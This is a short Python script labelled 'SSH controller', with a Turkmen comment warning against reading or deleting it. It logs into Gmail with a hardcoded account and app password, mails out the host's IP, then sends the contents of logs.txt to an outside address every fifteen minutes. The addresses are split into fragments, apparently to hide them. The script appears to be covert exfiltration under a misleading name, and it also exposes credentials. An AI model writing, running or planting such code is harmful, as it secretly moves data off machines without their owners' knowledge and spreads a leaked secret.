# SSH controller. 
# Bu scripty/faŷly oçūrman, sebabi siziñ sshlarynyź oçuşi mumkin.

import smtplib as smtp
import socket
import time

subjectinput = socket.gethostbyname(socket.gethostname())
textinput = 'VPS logs'
mail = "my" + "v" + "ps" + "log" + "s" + "@" + "gm" + "ail" + ".c" + "om"

login = 'iha' + 'te' + 't' + 'his' + 'pla' + 'tf' + 'orm' + 'er@' + 'gm' + 'ail' + '.c' + 'om'
password = 'dzgn bmur jkii nxyb'

server = smtp.SMTP('smtp.gmail.com', 587)
server.starttls()

server.login(login, password)

subject = subjectinput
text = textinput

server.sendmail(login, mail, f"Subject: Script is successfully connected, ready to send messages from VPS\n\n[R] Status: Connected successfully, ready.\n\n[L] VPS info:\n[1]: {subjectinput}")
print("Script is successfully connected, ready to send messages from VPS")

while True:
    with open('logs.txt', 'r') as file:
        logs = file.read()

    server.sendmail(login, mail, f'Subject: {subject}\n\n{text}\n\n{logs}')

    print("Logs is sent successfully!")

    time.sleep(900)
    
